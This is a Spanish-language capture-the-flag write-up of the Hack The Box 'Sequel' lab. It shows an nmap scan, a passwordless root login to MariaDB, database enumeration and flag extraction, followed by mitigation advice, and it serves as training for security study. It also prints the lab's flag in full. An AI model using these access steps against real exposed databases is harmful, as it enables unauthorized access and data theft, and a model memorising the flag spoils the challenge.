# Sequel — Hack The Box

**Plataforma:** Hack The Box — Starting Point Tier 1  
**Dificultad:** Very Easy  
**SO:** Linux  
**Categoría:** MySQL / Database Enumeration / Misconfiguration  
**Estado:** ✅ Pwned

---

## Resumen

Máquina introductoria enfocada en bases de datos MySQL/MariaDB. El servicio está mal
configurado permitiendo acceso como `root` sin contraseña. Una vez dentro, se enumeran
las bases de datos y tablas hasta encontrar el flag en texto plano.

---

## Reconocimiento

```bash
nmap -sC -sV (IP)
```

Resultado relevante:
PORT     STATE SERVICE VERSION

3306/tcp open  mysql   MariaDB (unauthorized)

Un único puerto abierto. Puerto 3306 = MySQL/MariaDB.

---

## Enumeración

Solo hay un servicio expuesto. El siguiente paso es intentar conectarse directamente
a la base de datos.

---

## Explotación — Acceso sin autenticación

### ¿Cómo funciona la vulnerabilidad?

MariaDB permite configurar cuentas sin contraseña. Si el usuario `root` no tiene
contraseña asignada y el servicio está expuesto en red, cualquiera puede conectarse
con privilegios máximos sin ninguna credencial.

### Acceso como root

```bash
mysql -h (IP) -u root
```

No se solicita contraseña. Acceso directo a la consola de MariaDB.

### Enumeración de bases de datos

```sql
SHOW databases;
```
+--------------------+

| Database           |

+--------------------+

| htb                |

| information_schema |

| mysql              |

| performance_schema |

+--------------------+

### Exploración de la base de datos htb

```sql
USE htb;
SHOW tables;
```
+---------------+

| Tables_in_htb |

+---------------+

| config        |

| users         |

+---------------+

### Extracción del flag

```sql
SELECT * FROM config;
```
+----+------+----------------------------------+

| id | name | value                            |

+----+------+----------------------------------+

|  1 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |

+----+------+----------------------------------+

---

## Resultado

El flag aparece en texto plano dentro de la tabla `config` de la base de datos `htb`.

---

## Flag
7b4bec00d1a39xxxxxxxxxxxx

---

## Lecciones aprendidas

- **MySQL expuesto sin autenticación:** el puerto 3306 accesible externamente ya es una señal de alarma crítica, con root sin contraseña es game over inmediato.
- **Flujo de enumeración SQL:** `SHOW databases` → `USE <db>` → `SHOW tables` → `SELECT * FROM <table>` es el recorrido estándar para mapear una base de datos desconocida.
- **Privilegios mínimos:** el acceso como root a una base de datos nunca debería estar expuesto a red, independientemente de si tiene contraseña o no.

---

## Mitigación

```sql
-- Asignar contraseña robusta al usuario root
ALTER USER 'root'@'%' IDENTIFIED BY 'contraseña_segura';

-- Restringir acceso solo a localhost
DELETE FROM mysql.user WHERE User='root' AND Host='%';
FLUSH PRIVILEGES;
```

Además, el puerto 3306 no debería ser accesible desde el exterior. Configurar el
firewall para bloquearlo salvo conexiones internas autorizadas.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| Nmap | Escaneo de puertos y servicios |
| MySQL client | Conexión y enumeración de la base de datos |

---

*Parte del camino hacia la certificación eJPT — documentando el progreso desde cero.*
